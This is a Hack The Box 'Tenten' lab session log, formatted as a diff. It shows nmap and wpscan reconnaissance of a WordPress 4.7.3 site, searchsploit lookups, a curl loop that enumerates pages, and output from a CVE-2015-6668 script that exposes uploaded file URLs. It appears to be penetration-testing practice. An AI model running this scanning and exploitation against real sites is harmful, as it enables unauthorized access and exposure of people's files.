@@ -1,0 +1,275 @@
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# nmap -T4 -A -p- -Pn -v 10.10.10.10
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-27 12:01 UTC
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 12:01
+Completed NSE at 12:01, 0.00s elapsed
+Initiating NSE at 12:01
+Completed NSE at 12:01, 0.00s elapsed
+Initiating NSE at 12:01
+Completed NSE at 12:01, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 12:01
+Completed Parallel DNS resolution of 1 host. at 12:01, 0.00s elapsed
+Initiating SYN Stealth Scan at 12:01
+Scanning 10.10.10.10 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.10
+Discovered open port 80/tcp on 10.10.10.10
+SYN Stealth Scan Timing: About 12.68% done; ETC: 12:05 (0:03:34 remaining)
+SYN Stealth Scan Timing: About 36.99% done; ETC: 12:04 (0:01:44 remaining)
+SYN Stealth Scan Timing: About 67.49% done; ETC: 12:03 (0:00:44 remaining)
+Completed SYN Stealth Scan at 12:03, 118.83s elapsed (65535 total ports)
+Initiating Service scan at 12:03
+Scanning 2 services on 10.10.10.10
+Completed Service scan at 12:03, 6.34s elapsed (2 services on 1 host)
+Initiating OS detection (try #1) against 10.10.10.10
+Retrying OS detection (try #2) against 10.10.10.10
+Initiating Traceroute at 12:03
+Completed Traceroute at 12:03, 0.15s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 12:03
+Completed Parallel DNS resolution of 2 hosts. at 12:03, 0.00s elapsed
+NSE: Script scanning 10.10.10.10.
+Initiating NSE at 12:03
+Completed NSE at 12:03, 5.92s elapsed
+Initiating NSE at 12:03
+Completed NSE at 12:03, 0.61s elapsed
+Initiating NSE at 12:03
+Completed NSE at 12:03, 0.00s elapsed
+Nmap scan report for 10.10.10.10
+Host is up (0.14s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-generator: WordPress 4.7.3
+|_http-title: Job Portal &#8211; Just another WordPress site
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 5.4 (92%), Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.2 - 4.9 (92%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.18 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Linux 4.8 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.002 days (since Fri May 27 12:00:28 2022)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=254 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# wpscan --url 10.10.10.10
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.21
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]
+[+] URL: http://10.10.10.10/ [10.10.10.10]
+[+] Started: Fri May 27 12:02:13 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.10.10/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.10.10/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.10.10/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.10.10/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
+ |  - http://10.10.10.10/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://10.10.10.10/wp-content/themes/twentyseventeen/
+ | Last Updated: 2022-01-25T00:00:00.000Z
+ | Readme: http://10.10.10.10/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.9
+ | Style URL: http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.10.10/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'
+
+[+] Enumerating All Plugins (via Passive Methods)
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] job-manager
+ | Location: http://10.10.10.10/wp-content/plugins/job-manager/
+ | Latest Version: 0.7.25 (up to date)
+ | Last Updated: 2015-08-25T22:44:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 7.2.5 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 <==============================================================================================> (137 / 137) 100.00% Time: 00:00:04
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri May 27 12:02:30 2022
+[+] Requests Done: 173
+[+] Cached Requests: 5
+[+] Data Sent: 42.305 KB
+[+] Data Received: 392.18 KB
+[+] Memory used: 245.668 MB
+[+] Elapsed time: 00:00:16
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# searchsploit WordPress 4.7.3
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                       | linux/webapps/41963.txt
+WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                           | php/webapps/44949.txt
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                    | multiple/webapps/47690.md
+WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                    | php/dos/47800.py
+WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                | php/remote/47187.rb
+WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                        | php/webapps/39553.txt
+WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities                                                                       | php/webapps/38176.txt
+WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                  | php/webapps/44943.txt
+WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                | php/webapps/48918.sh
+WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                            | php/webapps/44595.rb
+WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass                                                                                | php/webapps/43117.txt
+WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation                                                                 | php/webapps/46083.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# searchsploit job manager
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Plunet BusinessManager 4.1 - 'pagesUTF8/auftrag_job.jsp?Pfad' Direct Request Information Disclosure                                        | jsp/webapps/32710.txt
+WordPress Plugin Job Manager 0.7.22 - Persistent Cross-Site Scripting                                                                      | php/webapps/37738.txt
+WordPress Plugin Job Manager 4.1.0 - Cross-Site Scripting                                                                                  | php/webapps/45031.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Unauthorized Password Reset doesn't work.
+Try the Direct Request Information Disclosure bug, cve-2015-6668.
+https://gist.github.com/DoMINAToR98/4ed677db5832e4b4db41c9fa48e7bdef
+
+Found page 10.10.10.10/index.php/jobs/apply/8/
+
+Found job-manager plugin
+
+curl -s http://10.10.10.10/index.php/jobs/apply/8/ |grep entry-title | cut -d'>' -f2|cut -d'<' -f1
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# curl -s http://10.10.10.10/index.php/jobs/apply/8/ |grep entry-title
+                <h1 class="entry-title">Job Application: Pen Tester</h1>
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# curl -s http://10.10.10.10/index.php/jobs/apply/8/ |grep entry-title | cut -d'>' -f2|cut -d'<' -f1
+Job Application: Pen Tester
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# for i in {0..100}; do curl -s http://10.10.10.10/index.php/jobs/apply/$i/ |grep entry-title | cut -d'>' -f2|cut -d'<' -f1; done
+Job Application
+Job Application: Hello world!
+Job Application: Sample Page
+Job Application: Auto Draft
+Job Application
+Job Application: Jobs Listing
+Job Application: Job Application
+Job Application: Register
+Job Application: Pen Tester
+Job Application:
+Job Application: Application
+Job Application: cube
+Job Application: Application
+Job Application: HackerAccessGranted
+Job Application: Application
+Job Application: shell
+Job Application: Application
+Job Application: shell
+Job Application
+Job Application
+Job Application
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Tenten_10.10.10.10# python exploit.py
+CVE-2015-6668
+Title: CV filename disclosure on Job-Manager WP Plugin
+Author: Evangelos Mourikis
+Blog: https://vagmour.eu
+Plugin URL: http://www.wp-jobmanager.com
+Versions: <=0.7.25
+
+Hello world!
+2017
+2018
+Sample Page
+2017
+2018
+Auto Draft
+2017
+2018
+Jobs Listing
+2017
+2018
+Job Application
+2017
+2018
+Register
+2017
+2018
+Pen Tester
+2017
+2018
+Application
+2017
+2018
+cube
+2017
+[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/cube.png
+2018
+HackerAccessGranted
+2017
+[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+2018
+shell
+2017
+2018
+
